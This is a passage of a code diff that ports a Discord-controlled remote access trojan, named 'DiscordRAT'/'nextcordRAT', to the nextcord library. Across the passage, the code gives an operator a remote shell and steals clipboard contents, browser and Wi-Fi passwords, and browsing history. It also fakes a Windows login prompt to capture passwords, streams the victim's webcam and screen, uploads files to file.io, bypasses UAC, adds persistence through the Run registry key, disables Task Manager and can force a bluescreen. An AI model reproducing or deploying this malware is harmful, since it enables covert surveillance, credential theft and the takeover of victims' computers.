                     "File successfully sent to PC!", 
                     datetime.now(), 
                     "File path: " + file_path
                 )
             
 
-@slash.slash(name="Shell", description="run shell commands", guild_ids=g)
-async def Shell_command(ctx: SlashContext, command: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="shell", description="run shell commands", guild_ids=g)
+async def shell_command(interaction: Interaction, command: str):
+    if interaction.channel.name == channel_name:
         def shell():
             output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
             return output
@@ -739,93 +816,78 @@ async def Shell_command(ctx: SlashContext, command: str):
 
         if result != "":
             if numb < 1:
-                await ctx.send("unrecognized command or no output was obtained")
+                await interaction.channel.send("unrecognized command or no output was obtained")
             elif numb > 1990:
                 f1 = open("output.txt", 'a')
                 f1.write(result)
                 f1.close()
-                file = discord.File("output.txt", filename="output.txt")
+                file = nextcord.File("output.txt", filename="output.txt")
 
-                await ctx.send("Command successfully executed", file=file)
+                await interaction.channel.send("Command successfully executed", file=file)
                 os.remove("output.txt")
             else:
-                await ctx.send(f"Command successfully executed:\n```\n{result}```")
+                await interaction.channel.send(f"Command successfully executed:\n```\n{result}```")
         else:
-            await ctx.send("unrecognized command or no output was obtained")
+            await interaction.channel.send("unrecognized command or no output was obtained")
 
-@slash.slash(name="Write", description="Make the user type what ever you want", guild_ids=g)
-async def Write_command(ctx: SlashContext, message: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="write", description="Make the user type what ever you want", guild_ids=g)
+async def write_command(interaction: Interaction, message: str):
+    if interaction.channel.name == channel_name:
         import pyautogui
         import time
-        buttons = [
-                        create_button(
-                            style=ButtonStyle.green,
-                            label="✔"
-                        ),
-                        create_button(
-                            style=ButtonStyle.red,
-                            label="X"
-                        ),
-        ]
-        action_row = create_actionrow(*buttons)
-        await ctx.send("You want to press enter when finish writing?", components=[action_row])
-
-        res = await client.wait_for('button_click')
-        if res.component.label == "✔":
-                    await ctx.send(content="Press enter True", hidden=True)
-                    pressEnter = True
-        else:
-                    await ctx.send(content="Press enter False", hidden=True)
         try:
-            await ctx.send(f"Typing. . .")
+            view = rWrite()
+            await interaction.response.send_message("press enter?", view=view)
+            await view.wait()
+            await interaction.channel.send(f"Typing. . .")
             for letter in message:
                 pyautogui.typewrite(letter);sleep(0.00001)
             if pressEnter == True:
                 pyautogui.press('enter')
+            await interaction.channel.send(f"Done typing\n```\n{message}```")
         except Exception as e:
-                await ctx.send(f"Error\n```\n{e}```")
-        await ctx.send(f"Done typing\n```\n{message}```")
+                await interaction.channel.send(f"Error\n```\n{e}```")
+        
 
 
-@slash.slash(name="Clipboard", description="get their current clipboard", guild_ids=g)
-async def Clipboard_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="clipboard", description="get their current clipboard", guild_ids=g)
+async def clipboard_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         try:
             win32clipboard.OpenClipboard()
             data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
-            await ctx.send(f"Their Current Clipboard is:\n```{data}```")
+            await interaction.channel.send(f"Their Current Clipboard is:\n```{data}```")
         except:
-            await ctx.send(f'Clip format is not valid')
+            await interaction.channel.send(f'Clip format is not valid')
 
-@slash.slash(name="hokeys", description="hokeys", guild_ids=g)
-async def hokeys_command(ctx: SlashContext, key1: str,key2: str,times: int=1):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="hokeys", description="hokeys", guild_ids=g)
+async def hokeys_command(interaction: Interaction, key1: str,key2: str,times: int=1):
+    if interaction.channel.name == channel_name:
         import pyautogui
         try:
-            await ctx.send("pressing")
+            await interaction.channel.send("pressing")
             for i in range(times):
                 pyautogui.hotkey(key1, key2)
-            await ctx.send(f"press {key1}  {key2}   {times} times")
+            await interaction.channel.send(f"press {key1}  {key2}   {times} times")
         except Exception as e:
-            await ctx.send(e)
+            await interaction.channel.send(e)
 
-@slash.slash(name="AdminCheck", description=f"check if DiscordRAT has admin perms", guild_ids=g)
-async def AdminCheck_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="admincheck", description=f"check if nextcordRAT has admin perms", guild_ids=g)
+async def admincheck_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin == True:
-            embed = discord.Embed(title="AdminCheck", description=f"DiscordRAT Has Admin privileges!")
-            await ctx.send(embed=embed)
+            embed = nextcord.Embed(title="AdminCheck", description=f"nextcordRAT Has Admin privileges!")
+            await interaction.channel.send(embed=embed)
         else:
-            embed=discord.Embed(title="AdminCheck",description=f"DiscordRAT does not have admin privileges")
-            await ctx.send(embed=embed)
+            embed=nextcord.Embed(title="AdminCheck",description=f"nextcordRAT does not have admin privileges")
+            await interaction.channel.send(embed=embed)
 
 
-@slash.slash(name="IdleTime", description=f"check for how long your victim has been idle for", guild_ids=g)
-async def IdleTime_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="idletime", description=f"check for how long your victim has been idle for", guild_ids=g)
+async def idletime_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         class LASTINPUTINFO(ctypes.Structure):
             _fields_ = [
                 ('cbSize', ctypes.c_uint),
@@ -840,72 +902,46 @@ async def IdleTime_command(ctx: SlashContext):
             else:
                 return 0
         duration = get_idle_duration()
-        await ctx.send(f"**{os.getlogin()}'s** been idle for {duration} seconds.")
+        await interaction.channel.send(f"**{os.getlogin()}'s** been idle for {duration} seconds.")
 
 
-@slash.slash(name="BlockInput", description="Blocks user's keyboard and mouse", guild_ids=g)
-async def BlockInput_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="blockinput", description="Blocks user's keyboard and mouse", guild_ids=g)
+async def blockinput_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin == True:
             ctypes.windll.user32.BlockInput(True)
-            await ctx.send(f"Blocked **{os.getlogin()}'s** keyboard and mouse")
+            await interaction.channel.send(f"Blocked **{os.getlogin()}'s** keyboard and mouse")
         else:
-            await ctx.send("Sorry! Admin rights are required for this command")
+            await interaction.channel.send("Sorry! Admin rights are required for this command")
 
 
-@slash.slash(name="UnblockInput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
-async def UnblockInput_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="unblockinput", description="UnBlocks user's keyboard and mouse", guild_ids=g)
+async def unblockinput_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin == True:
             ctypes.windll.user32.BlockInput(False)
-            await ctx.send(f"Unblocked **{os.getlogin()}'s** keyboard and mouse")
+            await interaction.channel.send(f"Unblocked **{os.getlogin()}'s** keyboard and mouse")
         else:
-            await ctx.send("Sorry! Admin rights are required for this command")
+            await interaction.channel.send("Sorry! Admin rights are required for this command")
             
 
-@slash.slash(name="MsgBox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
-async def MessageBox_command(ctx: SlashContext, message: str):
-    if ctx.channel.name == channel_name:
-        def msgbox(message, type):
-            return ctypes.windll.user32.MessageBoxW(0, message, "Attention!", type | 0x1000)
-
-        select = create_select(
-        options=[
-            create_select_option(label="Error", value="Errors", emoji="⚠"),
-            create_select_option(label="Warning", value="Warnings", emoji="⚠"),
-            create_select_option(label="Info", value="Infos", emoji="ℹ"),
-            create_select_option(label="Question", value="Questions", emoji="⚠"),
-        ],
-        placeholder="Choose your type", 
-        min_values=1,
-        max_values=1,
-    )   
-        await ctx.send("What type of messagebox do you want to popup?", components=[create_actionrow(select)])
-
-        select_ctx: ComponentContext = await wait_for_component(client, components=[create_actionrow(select)])
-        if select_ctx.selected_options[0] == 'Errors':
-            threading.Thread(target=msgbox, args=(message, 16)).start()
-            await select_ctx.edit_origin(content=f"Sent an Error Message Saying {message}")
-        elif select_ctx.selected_options[0] == 'Warnings':
-            threading.Thread(target=msgbox, args=(message, 48)).start()
-            await select_ctx.edit_origin(content=f"Sent an Warning Message Saying {message}")
-        elif select_ctx.selected_options[0] == 'Infos':
-            threading.Thread(target=msgbox, args=(message, 64)).start()
-            await select_ctx.edit_origin(content=f"Sent an Info Message Saying {message}")
-        elif select_ctx.selected_options[0] == 'Questions':
-            threading.Thread(target=msgbox, args=(message, 32)).start()
-            await select_ctx.edit_origin(content=f"Sent an Question Message Asking {message}")
+@client.slash_command(name="msgbox", description="make a messagebox popup on their screen with a custom message", guild_ids=g)
+async def messagebox_command(interaction: Interaction, message: str):
+    if interaction.channel.name == channel_name:
+        global varMessageBox
+        varMessageBox = message
+        view = rMsgBox()
+        await interaction.response.send_message("witch msg box?", view=view)
+        await view.wait()
 
 
-
-
-@slash.slash(name="AdminRequest", description="this will try to get admin", guild_ids=g)
-async def AdminRequest_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="adminrequest", description="this will try to get admin", guild_ids=g)
+async def adminrequest_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         import ctypes, sys
-        await ctx.send("trying")
+        await interaction.channel.send("trying")
         def is_admin():
             try:
                 return ctypes.windll.shell32.IsUserAnAdmin()
@@ -913,16 +949,16 @@ async def AdminRequest_command(ctx: SlashContext):
                 return False
 
         if is_admin():
-            await ctx.send("`you are admin`")
+            await interaction.channel.send("`you are admin`")
         else:
             # Re-run the program with admin rights
             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-            await ctx.send("`request send`")
+            await interaction.channel.send("`request send`")
 
-@slash.slash(name="AdminForce", description="try and bypass uac and get admin rights", guild_ids=g)
-async def AdminForce_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-        await ctx.send(f"attempting to get admin privileges. . .")
+@client.slash_command(name="adminforce", description="try and bypass uac and get admin rights", guild_ids=g)
+async def adminforce_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+        await interaction.channel.send(f"attempting to get admin privileges. . .")
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
         if is_admin == False:
             try:
@@ -945,14 +981,35 @@ async def AdminForce_command(ctx: SlashContext):
                     sleep(2)
                     os.system("""powershell Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force""")
             except:
-                await ctx.send("Problem when tried to get admin")        
+                await interaction.channel.send("Problem when tried to get admin")        
         else:
-            await ctx.send("You already have admin privileges")
+            await interaction.channel.send("You already have admin privileges")
+
+@client.slash_command(name="restartprogram", description="restart rat", guild_ids=g)
+async def restartt_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("Restarting...")
+            temp = (os.getenv("TEMP"))
+            temp = temp + r"\restartt.bat"
+            if os.path.isfile(temp):
+                delelee = "del " + temp + r" /f"
+                os.system(delelee)
+            f5 = open(temp, 'w')
+            result = f"timeout 10 \n start {executable}"
+            f5.write(result)
+            f5.close()
+            temp2 = (os.getenv("TEMP"))
+            f5 = open(temp2 + r"\restartt.vbs", 'w')
+            result = f'set WshShell = wscript.createobject("WScript.shell") \n WshShell.run """{temp}"" ", 0, true \n Set WshShell = Nothing'
+            f5.write(result)
+            f5.close()
+            os.system(r"start %temp%\restartt.vbs")
+            os._exit(0)
 
 
-@slash.slash(name="Startup", description="Add the program to startup", guild_ids=g)
-async def Startup_command(ctx: SlashContext, reg_name: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="startup", description="Add the program to startup", guild_ids=g)
+async def startup_command(interaction: Interaction, reg_name: str):
+    if interaction.channel.name == channel_name:
         try:
             key1 = winreg.HKEY_CURRENT_USER
             key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -960,18 +1017,18 @@ async def Startup_command(ctx: SlashContext, reg_name: str):
 
             winreg.SetValueEx(open_,reg_name,0,winreg.REG_SZ, shutil.copy(sys.argv[0], os.getenv("appdata")+os.sep+os.path.basename(sys.argv[0])))
             open_.Close()
-            await ctx.send("Successfully added it to `run` startup")
+            await interaction.channel.send("Successfully added it to `run` startup")
         except PermissionError:
             shutil.copy(sys.argv[0], os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+os.path.basename(sys.argv[0]))
-            await ctx.send("Permission was denied, added it to `startup folder` instead")
+            await interaction.channel.send("Permission was denied, added it to `startup folder` instead")
 
 
 
 
-@slash.slash(name="WinPhishing", description="Add the program to startup", guild_ids=g)
-async def WinPhishing_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            await ctx.send("[*] Command successfuly executed")
+@client.slash_command(name="winphishing", description="Add the program to startup", guild_ids=g)
+async def winphishing_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("[*] Command successfuly executed")
             import sys
             import subprocess
             import os
@@ -983,24 +1040,24 @@ async def WinPhishing_command(ctx: SlashContext):
                output = subprocess.run(full_cmd, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                return output
             result = str(shell().stdout.decode('CP437'))
-            await ctx.send("password user typed in is: " + result)
+            await interaction.channel.send("password user typed in is: " + result)
 
 
-@slash.slash(name="voice", description="Add the program to startup", guild_ids=g)
-async def voice_command(ctx: SlashContext, text: str):
-    if ctx.channel.name == channel_name:
-            await ctx.send("speaking")
+@client.slash_command(name="voice", description="Add the program to startup", guild_ids=g)
+async def voice_command(interaction: Interaction, text: str):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("speaking")
             import win32com.client as wincl
             speak = wincl.Dispatch("SAPI.SpVoice")
             speak.Speak(text)
 
-            await ctx.send("spoken")
+            await interaction.channel.send("spoken")
 
 
-@slash.slash(name="passwords", description="Take all browser saved passwords", guild_ids=g)
-async def passwords_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-        await ctx.send("trying to get passwords")
+@client.slash_command(name="passwords", description="Take all browser saved passwords", guild_ids=g)
+async def passwords_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+        await interaction.channel.send("trying to get passwords")
         try:
              import subprocess
              import os
@@ -1014,20 +1071,20 @@ async def passwords_command(ctx: SlashContext):
              f4 = open(temp + r"\passwords.txt", 'w')
              f4.write(str(passwords))
              f4.close()
-             file = discord.File(temp + r"\passwords.txt", filename="passwords.txt")
-             await ctx.send("passwords", file=file)
+             file = nextcord.File(temp + r"\passwords.txt", filename="passwords.txt")
+             await interaction.channel.send("passwords", file=file)
              os.remove(temp + r"\passwords.txt")
         except:
-            await ctx.send("try again or there is no passwords or there is a problem")
+            await interaction.channel.send("try again or there is no passwords or there is a problem")
 
 
 
 
 
-@slash.slash(name="streamcam", description="Add the program to startup", guild_ids=g)
-async def streamcam_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            await ctx.send("streaming")
+@client.slash_command(name="streamcam", description="Add the program to startup", guild_ids=g)
+async def streamcam_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("streaming")
             import os
             import time
             import cv2
@@ -1045,8 +1102,8 @@ async def streamcam_command(ctx: SlashContext):
             while True:
                 return_value, image = camera.read()
                 cv2.imwrite(temp + r"\temp.png", image)
-                boom = discord.File(temp + r"\temp.png", filename="temp.png")
-                kool = await ctx.send(file=boom)
+                boom = nextcord.File(temp + r"\temp.png", filename="temp.png")
+                kool = await interaction.channel.send(file=boom)
                 temp = (os.getenv('TEMP'))
                 file = temp + r"\hobo\hello.txt"
                 if os.path.isfile(file):
@@ -1056,20 +1113,20 @@ async def streamcam_command(ctx: SlashContext):
                     continue
 
 
-@slash.slash(name="stopcam", description="Add the program to startup", guild_ids=g)
-async def stopcam_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            await ctx.send("stream stoped")
+@client.slash_command(name="stopcam", description="Add the program to startup", guild_ids=g)
+async def stopcam_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("stream stoped")
             import os
             os.system(r"mkdir %temp%\hobo")
             os.system(r"echo hello>%temp%\hobo\hello.txt")
             os.system(r"del %temp\temp.png /F")
 
 
-@slash.slash(name="streamscreen", description="Add the program to startup", guild_ids=g)
-async def streamscreen_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            await ctx.send("streaming screen")
+@client.slash_command(name="streamscreen", description="Add the program to startup", guild_ids=g)
+async def streamscreen_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("streaming screen")
             import os
             from mss import mss
             temp = (os.getenv('TEMP'))
@@ -1083,8 +1140,8 @@ async def streamscreen_command(ctx: SlashContext):
                 with mss() as sct:
                     sct.shot(output=os.path.join(os.getenv('TEMP') + r"\monitor.png"))
                 path = (os.getenv('TEMP')) + r"\monitor.png"
-                file = discord.File((path), filename="monitor.png")
-                await ctx.send(file=file)
+                file = nextcord.File((path), filename="monitor.png")
+                await interaction.channel.send(file=file)
                 temp = (os.getenv('TEMP'))
                 hellos = temp + r"\hobos\hellos.txt"
                 if os.path.isfile(hellos):
@@ -1093,82 +1150,82 @@ async def streamscreen_command(ctx: SlashContext):
                     continue
 
 
-@slash.slash(name="screenstop", description="Add the program to startup", guild_ids=g)
-async def screenstop_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            await ctx.send("stoped stream screen")
+@client.slash_command(name="screenstop", description="Add the program to startup", guild_ids=g)
+async def screenstop_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("stoped stream screen")
             os.system(r"mkdir %temp%\hobos")
             os.system(r"echo hello>%temp%\hobos\hellos.txt")
             os.system(r"del %temp%\monitor.png /F")
 
 
-@slash.slash(name="shutdown", description="shutdown pc", guild_ids=g)
-async def shutdown_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="shutdown", description="shutdown pc", guild_ids=g)
+async def shutdown_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import os
             uncritproc()
             os.system("shutdown /p")
-            await ctx.send("shutdown")
+            await interaction.channel.send("shutdown")
 
-@slash.slash(name="download", description="donwload a file pc", guild_ids=g)
-async def shutdown_command(ctx: SlashContext, path: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="download", description="donwload a file pc", guild_ids=g)
+async def shutdown_command(interaction: Interaction, path: str):
+    if interaction.channel.name == channel_name:
             import subprocess
             import os
             filename=path
             check2 = os.stat(filename).st_size
             if check2 > 7340032:
                 import requests
-                await ctx.send("this may take some time becuase it is over 8 MB. please wait")
+                await interaction.channel.send("this may take some time becuase it is over 8 MB. please wait")
                 response = requests.post('https://file.io/', files={"file": open(filename, "rb")}).json()["link"]
-                await ctx.send("download link: " + response)
-                await ctx.send("[*] Command successfuly executed")
+                await interaction.channel.send("download link: " + response)
+                await interaction.channel.send("[*] Command successfuly executed")
             else:
-                file = discord.File(path, filename=path)
-                await ctx.send("[*] Command successfuly executed", file=file)
+                file = nextcord.File(path, filename=path)
+                await interaction.channel.send("[*] Command successfuly executed", file=file)
 
 
-@slash.slash(name="restart", description="restart pc", guild_ids=g)
-async def restart_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="restart", description="restart pc", guild_ids=g)
+async def restart_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import os
             uncritproc()
             os.system("shutdown /r /t 00")
-            await ctx.send("restarting...")
+            await interaction.channel.send("restarting...")
             
-@slash.slash(name="logout", description="log out user", guild_ids=g)
-async def logout_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="logout", description="log out user", guild_ids=g)
+async def logout_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import os
             uncritproc()
             os.system("shutdown /l /f")
-            await ctx.send("logging off")
+            await interaction.channel.send("logging off")
 
-@slash.slash(name="critproc", description="critproc the program", guild_ids=g)
-async def critproc_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="critproc", description="critproc the program", guild_ids=g)
+async def critproc_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 critproc()
-                await ctx.send("Program critproc")
+                await interaction.channel.send("Program critproc")
             else:
-                await ctx.send(r"[*] Not admin :(")
+                await interaction.channel.send(r"[*] Not admin :(")
 
-@slash.slash(name="uncritproc", description="uncritproc the program", guild_ids=g)
-async def uncritproc_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="uncritproc", description="uncritproc the program", guild_ids=g)
+async def uncritproc_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import ctypes
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 uncritproc()
-                await ctx.send("program uncritproc")
+                await interaction.channel.send("program uncritproc")
             else:
-                await ctx.send(r"[*] Not admin :(")
+                await interaction.channel.send(r"[*] Not admin :(")
 
-@slash.slash(name="distaskmgr", description="disable taskmgr", guild_ids=g)
-async def distaskmgr_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="distaskmgr", description="disable taskmgr", guild_ids=g)
+async def distaskmgr_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import ctypes
             import os
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1199,14 +1256,14 @@ async def distaskmgr_command(ctx: SlashContext):
                 else:
                     import os
                     os.system('powershell New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value "1" -Force')
-                await ctx.send("disabled taskmgr :D")
+                await interaction.channel.send("disabled taskmgr :D")
             else:
-                await ctx.send("This command requires admin privileges")
+                await interaction.channel.send("This command requires admin privileges")
 
 
-@slash.slash(name="entaskmgr", description="enable taskmgr", guild_ids=g)
-async def entaskmgr_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="entaskmgr", description="enable taskmgr", guild_ids=g)
+async def entaskmgr_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import ctypes
             import os
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1234,18 +1291,18 @@ async def entaskmgr_command(ctx: SlashContext):
                     shel._running = False
                     result = str(shell().stdout.decode('CP437'))
                     if len(result) <= 5:
-                        await ctx.send("enabled taskmgr")  
+                        await interaction.channel.send("enabled taskmgr")  
                     else:
                         import winreg as reg
                         reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
-                        await ctx.send("enabled taskmgr")
+                        await interaction.channel.send("enabled taskmgr")
             else:
-                await ctx.send("[*] This command requires admin privileges")
+                await interaction.channel.send("[*] This command requires admin privileges")
 
 
-@slash.slash(name="wifipass", description="take wifi passwords", guild_ids=g)
-async def wifipass_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="wifipass", description="take wifi passwords", guild_ids=g)
+async def wifipass_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if is_admin == True:
                 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
@@ -1273,16 +1330,16 @@ async def wifipass_command(ctx: SlashContext):
                                 break
                         almoast = '"' + e + '"' + ":" + '"' + ok + '"'
                         done.append(almoast)
-                    await ctx.send("Taked wifi passwords:")  
-                    await ctx.send(done)
+                    await interaction.channel.send("Taked wifi passwords:")  
+                    await interaction.channel.send(done)
             else:
-                await ctx.send("This command requires admin privileges")
+                await interaction.channel.send("This command requires admin privileges")
 
-@slash.slash(name="history", description="take history webs", guild_ids=g)
-async def history_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="history", description="take history webs", guild_ids=g)
+async def history_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
         try:
-            await ctx.send("history")
+            await interaction.channel.send("history")
             import sqlite3
             import os
             import time
@@ -1306,35 +1363,35 @@ async def history_command(ctx: SlashContext):
                 f4.write(str("\n"))
                 f4.close()
             con.close()
-            file = discord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
-            await ctx.send("history", file=file)
+            file = nextcord.File(temp + r"\history12" + r"\history.txt", filename="history.txt")
+            await interaction.channel.send("history", file=file)
             def deleteme() :
                 path = "rmdir " + temp + r"\history12" + " /s /q"
                 os.system(path)
             deleteme()
         except Exception as e:
-            await ctx.send(e)
-@slash.slash(name="BlueScreen", description="blue screen pc", guild_ids=g)
-async def BlueScreen_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
-            await ctx.send("Pc has crashed (BlueScreen)")
+            await interaction.channel.send(e)
+@client.slash_command(name="bluescreen", description="blue screen pc", guild_ids=g)
+async def bluescreen_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
+            await interaction.channel.send("Pc has crashed (BlueScreen)")
             import ctypes
             import ctypes.wintypes
             ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
             ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
 
 
-@slash.slash(name="currentDir", description="current dir ", guild_ids=g)
-async def currentDir_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="currentdir", description="current dir ", guild_ids=g)
+async def currentdir_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import subprocess as sp
             output = sp.getoutput('cd')
-            await ctx.send("current dir : " + output)
+            await interaction.channel.send("current dir : " + output)
 
 
-@slash.slash(name="displayDir", description="dir", guild_ids=g)
-async def displayDir_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="displaydir", description="dir", guild_ids=g)
+async def displaydir_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import subprocess as sp
             import os
             import subprocess
@@ -1343,7 +1400,7 @@ async def displayDir_command(ctx: SlashContext):
                 result = output
                 numb = len(result)
                 if numb < 1:
-                    await ctx.send("[*] Command not recognized or no output was obtained")
+                    await interaction.channel.send("[*] Command not recognized or no output was obtained")
                 elif numb > 1990:
                     temp = (os.getenv('TEMP'))
                     if os.path.isfile(temp + r"\output22.txt"):
@@ -1351,23 +1408,23 @@ async def displayDir_command(ctx: SlashContext):
                     f1 = open(temp + r"\output22.txt", 'a')
                     f1.write(result)
                     f1.close()
-                    file = discord.File(temp + r"\output22.txt", filename="output22.txt")
-                    await ctx.send("[*] Command successfuly executed", file=file)
+                    file = nextcord.File(temp + r"\output22.txt", filename="output22.txt")
+                    await interaction.channel.send("[*] Command successfuly executed", file=file)
                 else:
-                    await ctx.send("[*] Command successfuly executed : " + result)
+                    await interaction.channel.send("[*] Command successfuly executed : " + result)
 
 
 
-@slash.slash(name="listProcess", description="list all Process", guild_ids=g)
-async def listProcess_command(ctx: SlashContext):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="listprocess", description="list all Process", guild_ids=g)
+async def listprocess_command(interaction: Interaction):
+    if interaction.channel.name == channel_name:
             import os
             import subprocess
             if 1==1:
                 result = subprocess.getoutput("tasklist")
                 numb = len(result)
                 if numb < 1:
-                    await ctx.send("[*] Command not recognized or no output was obtained")
+                    await interaction.channel.send("[*] Command not recognized or no output was obtained")
                 elif numb > 1990:
                     temp = (os.getenv('TEMP'))
                     if os.path.isfile(temp + r"\output.txt"):
@@ -1375,18 +1432,18 @@ async def listProcess_command(ctx: SlashContext):
                     f1 = open(temp + r"\output.txt", 'a')
                     f1.write(result)
                     f1.close()
-                    file = discord.File(temp + r"\output.txt", filename="output.txt")
-                    await ctx.send("[*] Command successfuly executed", file=file)
+                    file = nextcord.File(temp + r"\output.txt", filename="output.txt")
+                    await interaction.channel.send("[*] Command successfuly executed", file=file)
                 else:
-                    await ctx.send("[*] Command successfuly executed : " + result)
+                    await interaction.channel.send("[*] Command successfuly executed : " + result)
 
 
 
 
 
-@slash.slash(name="killProcess", description="kill Process", guild_ids=g)
-async def killProcess_command(ctx: SlashContext, process: str):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="killprocess", description="kill Process", guild_ids=g)
+async def killprocess_command(interaction: Interaction, process: str):
+    if interaction.channel.name == channel_name:
             import os
             proc = process
             kilproc = r"taskkill /IM" + ' "' + proc + '" ' + r"/f"
@@ -1402,9 +1459,9 @@ async def killProcess_command(ctx: SlashContext, process: str):
             last_line = output.strip().split('\r\n')[-1]
             done = (last_line.lower().startswith(process_name.lower()))
             if done == False:
-                await ctx.send("[*] Command successfuly executed")
+                await interaction.channel.send("[*] Command successfuly executed")
             elif done == True:
-                await ctx.send('[*] Command did not exucute properly')
+                await interaction.channel.send('[*] Command did not exucute properly')
 
 
 
@@ -1412,9 +1469,9 @@ async def killProcess_command(ctx: SlashContext, process: str):
 
 
 
-@slash.slash(name="delete", description="delete a file", guild_ids=g)
-async def delete_command(ctx: SlashContext, filepath: float):
-    if ctx.channel.name == channel_name:
+@client.slash_command(name="delete", description="delete a file", guild_ids=g)
+async def delete_command(interaction: Interaction, filepath: float):
+    if interaction.channel.name == channel_name:
             global statue
             import time
             import subprocess
@@ -1436,18 +1493,18 @@ async def delete_command(ctx: SlashContext, filepath: float):
             if statue:
                 numb = len(result)
                 if numb > 0:
-                    await ctx.send("[*] an error has occurred")
+                    await interaction.channel.send("[*] an error has occurred")
                 else:
-                    await ctx.send("[*] Command successfuly executed")
+                    await interaction.channel.send("[*] Command successfuly executed")
             else:
-                await ctx.send("[*] Command not recognized or no output was obtained")
+                await interaction.channel.send("[*] Command not recognized or no output was obtained")
                 statue = None
 
 
 
